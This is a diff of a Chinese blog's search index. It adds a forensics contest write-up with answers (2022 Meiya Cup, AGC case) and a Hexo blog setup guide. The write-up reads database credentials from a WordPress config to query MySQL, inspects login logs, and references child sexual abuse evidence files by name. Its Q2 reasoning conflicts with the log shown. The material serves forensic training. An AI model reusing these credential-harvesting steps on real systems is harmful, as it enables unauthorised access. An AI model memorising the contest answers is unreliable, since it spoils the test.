@@ -1,6 +1,151 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2022美亚杯团体赛AGC</title>
+    <url>/posts/a0796263.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>搜查人员于现场捡取一部服务器、一部员工 （Carson） 所用的桌面计算机及一 部流媒体服务器。 AGC 集团 IT 部門 人员称建立服务器的同事已离职，他只是 负责以浏览器登入服务器操作，对系统并不熟悉。 他只知道服务器所用的操作 系统为 “Proxmox”，上面运作一个虚拟计算器。 虚拟计算机运作公司的电邮系 统“Xeams”。现场专家在初步分析后表示“Proxmox”服务器透过三个硬盘以软 RAID 建立而成，<br>现场虽未能撷取服务器逻辑存储（Logical Storage）内容，但他认为先撷取逻辑存 储内容作检验较好; 桌面计算机相信被黑客入侵，分析流量纪录相信黑客取走了 服务器部份档案。</p>
+<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="流媒体服务器分析"><a href="#流媒体服务器分析" class="headerlink" title="流媒体服务器分析"></a>流媒体服务器分析</h2><h3 id="2-填空题-就AGC集团网络的流媒体服务器-Media-Server-，有多少个本地用户曾经成功登录过-以阿拉伯数字回答-1分"><a href="#2-填空题-就AGC集团网络的流媒体服务器-Media-Server-，有多少个本地用户曾经成功登录过-以阿拉伯数字回答-1分" class="headerlink" title="2.[填空题] 就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答) (1分)"></a>2.[填空题] 就AGC集团网络的流媒体服务器 (Media Server)，有多少个本地用户曾经成功登录过? (以阿拉伯数字回答) (1分)</h3><p><strong>使用lastlog命令查看各个用户登录情况</strong></p>
+<p>lastlog命令列出了各个用户的登录情况，如果没有登录过，则显示Never logged in，如果有登录历史，则显示出ip及登录时间。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo lastlog</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user             pts/1    192.168.182.139  四 7月 21 10:25:36 +0800 2022</span><br><span class="line">sshd                                       **Never logged in**</span><br><span class="line">sammy            pts/1    192.168.182.1    五 7月 22 14:22:40 +0800 2022</span><br><span class="line">mysql                                      **Never logged in**</span><br><span class="line">mediauser        pts/0    192.168.182.1    二 7月 19 15:04:39 +0800 2022</span><br></pre></td></tr></table></figure>
+
+<p>本地用户登录成功的有：reboot、mediause、sammy</p>
+<blockquote>
+<p>答案：3</p>
+</blockquote>
+<h3 id="3-就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用-‘ssh’-Secure-Shell-登录过-以阿拉伯数字回答-2分"><a href="#3-就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用-‘ssh’-Secure-Shell-登录过-以阿拉伯数字回答-2分" class="headerlink" title="3.就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答) (2分)"></a>3.就AGC集团网络的流媒体服务器，有多少个本地用户曾经成功用 ‘ssh’ (Secure Shell)登录过? (以阿拉伯数字回答) (2分)</h3><p>通过使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">last</span><br><span class="line">lastlog</span><br></pre></td></tr></table></figure>
+
+<p>对比得出只有reboot、mediause、sammy三个用户的成功登录记录</p>
+<blockquote>
+<p>答案：3</p>
+</blockquote>
+<h3 id="4-填空题-就上述的本地用户，成功通过-‘ssh’-登录过该流媒体服务器多少次-以阿拉伯数字回答-3分"><a href="#4-填空题-就上述的本地用户，成功通过-‘ssh’-登录过该流媒体服务器多少次-以阿拉伯数字回答-3分" class="headerlink" title="4.[填空题]就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答) (3分)"></a>4.[填空题]就上述的本地用户，成功通过 ‘ssh’ 登录过该流媒体服务器多少次? (以阿拉伯数字回答) (3分)</h3><p>火眼取证分析工具</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：Liunx基本信息——&gt;分区——&gt;登录日志——&gt;登录成功</span><br></pre></td></tr></table></figure>
+
+<p>进行登录ip筛选排序可以得到有12次</p>
+<blockquote>
+<p>答案：12</p>
+</blockquote>
+<h3 id="5-单选题-试找找记录失败的登录尝试信息-有以下哪一个名称曾尝试用-‘ssh-notty’-登录该流媒体服务器-2分"><a href="#5-单选题-试找找记录失败的登录尝试信息-有以下哪一个名称曾尝试用-‘ssh-notty’-登录该流媒体服务器-2分" class="headerlink" title="5.[单选题]试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器? (2分)"></a>5.[单选题]试找找记录失败的登录尝试信息. 有以下哪一个名称曾尝试用 ‘ssh:notty’ 登录该流媒体服务器? (2分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. iamhacker</span><br><span class="line">B. hacking</span><br><span class="line">C. hack</span><br><span class="line">D. hacker</span><br><span class="line">E. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>在/var/log/btmp中可以查看到登陆失败的记录（可通过lastb命令进行检查）</p>
+<p>直接打开备份日志中可以看到有两个用户：sammy、hack</p>
+<blockquote>
+<p>答案：C</p>
+</blockquote>
+<h3 id="6-填空题-就该流媒体服务器的本地用户-有一个用户名是-‘S’-开头的-该用户的姓氏是什么-以大写英文回答-3分"><a href="#6-填空题-就该流媒体服务器的本地用户-有一个用户名是-‘S’-开头的-该用户的姓氏是什么-以大写英文回答-3分" class="headerlink" title="6.[填空题]就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答) (3分)"></a>6.[填空题]就该流媒体服务器的本地用户, 有一个用户名是 ‘S’ 开头的, 该用户的姓氏是什么? (以大写英文回答) (3分)</h3><p>硬着头皮从数据库上一个个找</p>
+<p>解析数据库，首先在配置文件中找到数据库登录用户和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** Database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;wordpress&#x27; );</span><br><span class="line">/** Database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;user&#x27; );</span><br></pre></td></tr></table></figure>
+
+<p>解析数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uwordpress -puser</span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_usermeta;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nickname sammy         </span><br><span class="line">first_name sammy         </span><br><span class="line">last_name Li </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：Li</p>
+</blockquote>
+<h3 id="7-多选题-该流媒体服务器是有使用Docker容器-Docker-Container-的，当中包含以下哪个Docker镜像-Docker-Image-3分"><a href="#7-多选题-该流媒体服务器是有使用Docker容器-Docker-Container-的，当中包含以下哪个Docker镜像-Docker-Image-3分" class="headerlink" title="7.[多选题]该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ? (3分)"></a>7.[多选题]该流媒体服务器是有使用Docker容器 (Docker Container) 的，当中包含以下哪个Docker镜像 (Docker Image) ? (3分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. apache2</span><br><span class="line">B. ubuntu</span><br><span class="line">C. centos</span><br><span class="line">D. nginx</span><br><span class="line">E. hello-world</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>可以直接通过取证软件查看</p>
+<p>或者通过命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：BCDE</p>
+</blockquote>
+<h3 id="8-单选题-就上述的Docker镜像，哪一个镜像在系统上运行中-2分"><a href="#8-单选题-就上述的Docker镜像，哪一个镜像在系统上运行中-2分" class="headerlink" title="8.[单选题]就上述的Docker镜像，哪一个镜像在系统上运行中? (2分)"></a>8.[单选题]就上述的Docker镜像，哪一个镜像在系统上运行中? (2分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. apache2</span><br><span class="line">B. ubuntu</span><br><span class="line">C. centos</span><br><span class="line">D. nginx</span><br><span class="line">E. hello-world</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：D</p>
+</blockquote>
+<h3 id="9-多选题-该流媒体服务器是使用-‘WordPress’-建站-Create-Website-的，就-‘比特币’-标题，有以下的电子邮箱地址曾经留有评论-2分"><a href="#9-多选题-该流媒体服务器是使用-‘WordPress’-建站-Create-Website-的，就-‘比特币’-标题，有以下的电子邮箱地址曾经留有评论-2分" class="headerlink" title="9.[多选题]该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的，就 ‘比特币’ 标题，有以下的电子邮箱地址曾经留有评论? (2分)"></a>9.[多选题]该流媒体服务器是使用 ‘WordPress’ 建站 (Create Website) 的，就 ‘比特币’ 标题，有以下的电子邮箱地址曾经留有评论? (2分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. cn.wordpress.org</span><br><span class="line">B. root58462@mail.qq.com</span><br><span class="line">C. hi456@163.com</span><br><span class="line">D. root@163.com</span><br><span class="line">E. user1@localhost.net</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>一般做法：</p>
+<p>解析数据库，首先在配置文件中找到数据库登录用户和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** Database username */</span><br><span class="line">define( &#x27;DB_USER&#x27;, &#x27;wordpress&#x27; );</span><br><span class="line">/** Database password */</span><br><span class="line">define( &#x27;DB_PASSWORD&#x27;, &#x27;user&#x27; );</span><br></pre></td></tr></table></figure>
+
+<p>登录数据后操作一手</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uwordpress -puser</span><br><span class="line">show databases;</span><br><span class="line">use wordpress;</span><br><span class="line">show tables;</span><br><span class="line">select * from wp_comments;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：BC</p>
+</blockquote>
+<h3 id="10-单选题-该流媒体服务器里其中一个本地用户是有使用-‘calendar’-日历工具的-日历内曾经提及以下哪个网站-3分"><a href="#10-单选题-该流媒体服务器里其中一个本地用户是有使用-‘calendar’-日历工具的-日历内曾经提及以下哪个网站-3分" class="headerlink" title="10.[单选题]该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站? (3分)"></a>10.[单选题]该流媒体服务器里其中一个本地用户是有使用 ‘calendar’ 日历工具的, 日历内曾经提及以下哪个网站? (3分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. https://weibo.com</span><br><span class="line">B. http://www.baidu.com</span><br><span class="line">C. https://www.douyin.com</span><br><span class="line">D. https://youku.com</span><br><span class="line">E. https://www.binance.com</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>直接打开</p>
+<blockquote>
+<p>答案：E</p>
+</blockquote>
+<h3 id="11-单选题-该流媒体服务器里是有使用磁盘阵列-RAID-的-该设备是使用哪一个-RAID-级别-请选择最合适的答案-1分"><a href="#11-单选题-该流媒体服务器里是有使用磁盘阵列-RAID-的-该设备是使用哪一个-RAID-级别-请选择最合适的答案-1分" class="headerlink" title="11.[单选题]该流媒体服务器里是有使用磁盘阵列 (RAID) 的, 该设备是使用哪一个 RAID 级别? (请选择最合适的答案) (1分)"></a>11.[单选题]该流媒体服务器里是有使用磁盘阵列 (RAID) 的, 该设备是使用哪一个 RAID 级别? (请选择最合适的答案) (1分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. RAID 0</span><br><span class="line">B. RAIDz2</span><br><span class="line">C. RAIDz3</span><br><span class="line">D. RAID 10</span><br><span class="line">E. RAID 5</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>调查报告中显示raid级别为<code>mirror</code></p>
+<blockquote>
+<p>答案：F</p>
+</blockquote>
+<h3 id="12-单选题-该基本镜像存储池-Basic-Storage-Pool-里储存了一些视频档案-请找出一段儿童色情影片-该档案的最后修改时间是什么月份-2分"><a href="#12-单选题-该基本镜像存储池-Basic-Storage-Pool-里储存了一些视频档案-请找出一段儿童色情影片-该档案的最后修改时间是什么月份-2分" class="headerlink" title="12.[单选题]该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份? (2分)"></a>12.[单选题]该基本镜像存储池 (Basic Storage Pool) 里储存了一些视频档案, 请找出一段儿童色情影片, 该档案的最后修改时间是什么月份? (2分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A. Jun</span><br><span class="line">B. Jul</span><br><span class="line">C. Aug</span><br><span class="line">D. Sep</span><br><span class="line">E. Oct</span><br><span class="line">F. 以上皆非</span><br></pre></td></tr></table></figure>
+
+<p>我使用火眼仿真系统，仿真的时候将所有镜像都选择上，排序为acbde，根据调查报告来走。</p>
+<p>使用命令<code>Open /media0/mediastorage</code></p>
+<p>文件名为迷住了幼迷住.mp4</p>
+<blockquote>
+<p>答案：D</p>
+</blockquote>
+<h3 id="13-填空题-承上题，拥有该段儿童色情影片的用户名称是什么-不要输入符号，以大写英文及阿拉伯数字回答-1分"><a href="#13-填空题-承上题，拥有该段儿童色情影片的用户名称是什么-不要输入符号，以大写英文及阿拉伯数字回答-1分" class="headerlink" title="13.[填空题]承上题，拥有该段儿童色情影片的用户名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答) (1分)"></a>13.[填空题]承上题，拥有该段儿童色情影片的用户名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答) (1分)</h3><p>ll并不是linux下一个基本的命令，它实际上是ls -l的一个别名。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ll -grep | 迷住了</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>答案：ROOT</p>
+</blockquote>
+<h3 id="14-填空题-就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-https-web3-com，需回答-HTTPSWEB3COM"><a href="#14-填空题-就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-https-web3-com，需回答-HTTPSWEB3COM" class="headerlink" title="14.[填空题]就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 https://web3.com，需回答 HTTPSWEB3COM)"></a>14.[填空题]就AGC集团网络的流媒体服务器，曾经有用户搜索过有关于儿童色情影片的资料而得到搜索结果，该用户所输入的网址是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 <a href="https://web3.com,需回答/">https://web3.com，需回答</a> HTTPSWEB3COM)</h3><blockquote>
+<p>待定</p>
+</blockquote>
+<h3 id="15-填空题-该基本镜像存储池-pool-有一个快照-Snapshot-，快照的名称是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-media-mediapool-abc123，需回答MEDIAMEDIAPOOLABC123-1分"><a href="#15-填空题-该基本镜像存储池-pool-有一个快照-Snapshot-，快照的名称是什么-不要输入符号，以大写英文及阿拉伯数字回答，如-media-mediapool-abc123，需回答MEDIAMEDIAPOOLABC123-1分" class="headerlink" title="15.[填空题]该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123) (1分)"></a>15.[填空题]该基本镜像存储池 (pool) 有一个快照 (Snapshot)，快照的名称是什么? (不要输入符号，以大写英文及阿拉伯数字回答，如 media/mediapool@abc123，需回答MEDIAMEDIAPOOLABC123) (1分)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zpool list</span><br><span class="line">查看池健康状态和空间使用情况</span><br></pre></td></tr></table></figure>
+
+<p>可以使用 <code>-t</code> 选项指定要显示的数据集的类型</p>
+<table>
+<thead>
+<tr>
+<th align="left">类型</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>filesystem</code></td>
+<td align="left">文件系统和克隆</td>
+</tr>
+<tr>
+<td align="left"><code>volume</code></td>
+<td align="left">卷</td>
+</tr>
+<tr>
+<td align="left"><code>snapshot</code></td>
+<td align="left">快照</td>
+</tr>
+</tbody></table>
+<p>使用命令<code>zfs list -t snapshot</code></p>
+<blockquote>
+<p>答案：MEDIA0MEDIASTORAGEVERSION1</p>
+</blockquote>
+<h3 id="16-填空题-就上述所找到的基本镜像存储池快照-Snapshot-，它储存了多少个档案-以阿拉伯数字回答-1分"><a href="#16-填空题-就上述所找到的基本镜像存储池快照-Snapshot-，它储存了多少个档案-以阿拉伯数字回答-1分" class="headerlink" title="16. [填空题]就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答) (1分)"></a>16. [填空题]就上述所找到的基本镜像存储池快照 (Snapshot)，它储存了多少个档案? (以阿拉伯数字回答) (1分)</h3><p>使用命令<code>zfs rollback media0/mediastorage@version1</code>回滚镜像，查看文件数量</p>
+<blockquote>
+<p>答案：24</p>
+</blockquote>
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="21-单选题-分析IP地址61-238-217-108向AGC服务器10-0-66-184发送的第一个-‘GET’-指令，它请求的统一资源定位系统-Uniform-Resource-Locator-URL-是什么-1分"><a href="#21-单选题-分析IP地址61-238-217-108向AGC服务器10-0-66-184发送的第一个-‘GET’-指令，它请求的统一资源定位系统-Uniform-Resource-Locator-URL-是什么-1分" class="headerlink" title="21. [单选题]分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么? (1分)"></a>21. [单选题]分析IP地址61.238.217.108向AGC服务器10.0.66.184发送的第一个 ‘GET’ 指令，它请求的统一资源定位系统 (Uniform Resource Locator - URL) 是什么? (1分)</h3>]]></content>
+      <categories>
+        <category>电子取证</category>
+      </categories>
+      <tags>
+        <tag>2022美亚杯</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>AWD学习日记一</title>
     <url>/posts/2fe68c90.html</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>AWD到时方恨不会，进一年两年没有打线下赛了，脚本也没有了，工具也没有。赶紧跟着大佬复习一波，做一下笔记。</p>
@@ -210,6 +355,138 @@
       </tags>
   </entry>
   <entry>
+    <title>Hexo搭建个人博客教程</title>
+    <url>/posts/6e27c1a7.html</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本站点是由<code>Hexo+Butterfly</code>主题搭建起来的，本文章就是想记录一下网站的搭建，以及整理一下自己的思路。希望能够给初手提供一些小小的帮助。</p>
+<h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="搭建准备"><a href="#搭建准备" class="headerlink" title="搭建准备"></a>搭建准备</h2><p>1.基础软件与工具的安装</p>
+<ul>
+<li><a href="https://github.com/">GitHub</a></li>
+<li><a href="https://git-scm.com/">Git</a></li>
+<li><a href="https://hexo.io/zh-cn/">Hexo</a></li>
+<li><a href="https://nodejs.org/en/">Node.js</a></li>
+</ul>
+<p><strong>Node安装</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">官网下载，具体安装教程借鉴：https://blog.csdn.net/web18224617243/article/details/123191441</span><br></pre></td></tr></table></figure>
+
+<p><strong>Git安装</strong></p>
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">去官网下载，具有安装教程借鉴：</span><br><span class="line">https://blog.csdn.net/mukes/article/details/115693833</span><br></pre></td></tr></table></figure>
+
+<p><strong>Hexo安装</strong></p>
+<p>安装<strong>Hexo</strong>，在<strong>Git Bash</strong>中执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<p>创建一个新目录，我的是<code>D:\program\blog</code>，并且执行初始化：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init Blog</span><br><span class="line">或</span><br><span class="line">cd Blog &amp;&amp; hexo init</span><br></pre></td></tr></table></figure>
+
+<p>2.本地搭建</p>
+<p>先后执行下面命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+
+<p>访问默认地址 <strong><a href="http://localhosy:4000/">http://localhosy:4000</a></strong> 就可以查看到搭建起来的博客，<strong>Ctrl+C</strong>就可以停止服务。</p>
+<p>如果4000端口被占用，使用以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -p 5000 （端口自定义）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><ol>
+<li><p>在GitHub上新建一个仓，仓库与你的用户名相同，仓要公开。</p>
+<p>注意： 仓库名称的<strong>前半部分与你的用户名一致</strong>，即 lummod，<strong>后半部分为 yourname.git.io 固定格式</strong>（忽略红色警告，因为我已经创建过了！），可以选择一个readme为说明文件（随便），然后<strong>点击创建仓库</strong></p>
+</li>
+<li><p>在博客目录下，执行以下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm insatll -g hexo-cli</span><br><span class="line">hexo init （如果前面初始化和安装过就不用了）</span><br></pre></td></tr></table></figure></li>
+<li><p>绑定GitHub，添加SSH key，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;yourname&quot;</span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br><span class="line"></span><br><span class="line">ssh-keygen -t rsa -C &quot;邮箱&quot;</span><br></pre></td></tr></table></figure>
+
+<p>添加到 GitHub ，复制密钥文件内容（路径如<code>C:\Users\Administrator\.ssh\id_rsa.pub</code>），粘贴到 <a href="https://github.com/settings/keys">New SSH Key</a>即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
+
+<p>接着输入命令连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br><span class="line">yes</span><br></pre></td></tr></table></figure>
+
+<p>测试，如果回显返回“You’ve successfully authenticated”即成功。</p>
+</li>
+<li><p>打开根目录下的_config.yml，写入：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: https://github.com/fengye97/fengye97.github.io.git  #你的仓库地址</span><br><span class="line">  branch: master 你的目录 </span><br><span class="line">  #ps: 要注意空格</span><br></pre></td></tr></table></figure></li>
+<li><p>安装Git部属插件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">日常三连: hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+
+<p>如果成功，输入github域名即可进入</p>
+</li>
+</ol>
+<h2 id="解析域名"><a href="#解析域名" class="headerlink" title="解析域名"></a>解析域名</h2><p>本步骤需要购买域名，我用的是阿里云，所以就以阿里云为例。</p>
+<p>第一步：在阿里云控制台中，点击解析并添加两条解析记录</p>
+<ol>
+<li><p>添加 CNAME 记录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">类型选择为 CNAME；</span><br><span class="line"></span><br><span class="line">主机记录即域名前缀为www；</span><br><span class="line"></span><br><span class="line">记录值填写为yourname.github.io；</span><br><span class="line"></span><br><span class="line">解析线路，TTL 默认即可。</span><br></pre></td></tr></table></figure></li>
+<li><p>添加 两条A 记录指向 192.30.252.153和192.30.252.154</p>
+<p>类型选择为 A；</p>
+<p>主机记录即域名前缀，填写为@；</p>
+<p>记录值填写为192.30.252.153和192.30.252.154；</p>
+<p>解析线路，境外或谷歌。</p>
+</li>
+</ol>
+<p>A记录类型的记录值为<strong>IPV4</strong>地址，通过ping域名得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping zhou-boop.github.io    #ping + 你的GitHub的网址</span><br></pre></td></tr></table></figure>
+
+<p>第二步：在根目录下的 <strong>source</strong> 文件中新建 <strong>CNAME</strong> 文件，文件中写入你的域名(购买的)，不要加上www。</p>
+<p>第三步：重新部署一下</p>
+<p>在 <strong>Github</strong> 查看 <strong>CNAME</strong> 文件以及网址。</p>
+<p>输入域名就可以直接登录网站了。</p>
+<h1 id="博客配置"><a href="#博客配置" class="headerlink" title="博客配置"></a>博客配置</h1><h2 id="Hexo-博客生成永久链接"><a href="#Hexo-博客生成永久链接" class="headerlink" title="Hexo 博客生成永久链接"></a>Hexo 博客生成永久链接</h2><p>Hexo 文章链接默认的生成规则是：<code>:year/:month/:day/:title</code>，是按照年、月、日、标题来生成的。</p>
+<p>修改链接有助于别人记录，方便自己随时修改文章的内容，只要不改变 footer-matter 中的 id 值，那么文章链接永远不会变。</p>
+<p><strong>安装插件</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-abbrlink --save</span><br></pre></td></tr></table></figure>
+
+<p><strong>修改配置文件</strong></p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">## permalink: :year/:month/:day/:title/</span></span><br><span class="line"><span class="comment">## 此处可以自己设置</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink/</span> </span><br><span class="line"><span class="comment"># or</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">posts/:abbrlink.html</span></span><br></pre></td></tr></table></figure>
+
+<p>在文件中增加配置</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># abbrlink config</span></span><br><span class="line"><span class="attr">abbrlink:</span></span><br><span class="line">  <span class="attr">alg:</span> <span class="string">crc32</span>      <span class="comment">#support crc16(default) and crc32</span></span><br><span class="line">  <span class="attr">rep:</span> <span class="string">hex</span>        <span class="comment">#support dec(default) and hex</span></span><br><span class="line">  <span class="attr">drafts:</span> <span class="literal">false</span>   <span class="comment">#(true)处理草稿,(false)不处理草稿. false(default) </span></span><br><span class="line">  <span class="comment"># 从目录树生成类别</span></span><br><span class="line">  <span class="comment"># depth: 要生成的目录树的最大深度，应该&gt; 0</span></span><br><span class="line">  <span class="attr">auto_category:</span></span><br><span class="line">     <span class="attr">enable:</span> <span class="literal">true</span>  <span class="comment">#true(default)</span></span><br><span class="line">     <span class="attr">depth:</span>        <span class="comment">#3(default)</span></span><br><span class="line">     <span class="attr">over_write:</span> <span class="literal">false</span> </span><br><span class="line">  <span class="attr">auto_title:</span> <span class="literal">false</span> <span class="comment">#启用自动标题，它可以根据路径自动填充标题</span></span><br><span class="line">  <span class="attr">auto_date:</span> <span class="literal">false</span> <span class="comment">#启用自动日期，它可以根据今天的时间自动填充日期</span></span><br><span class="line">  <span class="attr">force:</span> <span class="literal">false</span> <span class="comment">#启用强制模式，在这种模式下，插件将忽略缓存，并为每个帖子计算缩写链接，即使它已经有缩写链接。 这只会更新 abbrlink 而不是其他前面的变量。</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>样式</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crc16 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/66c8.html</span><br><span class="line"></span><br><span class="line">crc16 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/65535.html</span><br><span class="line">#32</span><br><span class="line">crc32 &amp; hex</span><br><span class="line">https://post.zz173.com/posts/8ddf18fb.html</span><br><span class="line"></span><br><span class="line">crc32 &amp; dec</span><br><span class="line">https://post.zz173.com/posts/1690090958.html</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>github地址：<a href="https://github.com/Rozbo/hexo-abbrlink">hexo-abbrlink</a></p>
+</blockquote>
+<h2 id="设置菜单"><a href="#设置菜单" class="headerlink" title="设置菜单"></a>设置菜单</h2><p>主题配置文件，关键字：<strong>menu</strong>，删除前面的注释就可以启用</p>
+<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="attr">home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="comment">#about: /about/ || fa fa-user</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="attr">categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-th</span></span><br><span class="line">  <span class="attr">archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fa</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">/resources/</span> <span class="string">||</span> <span 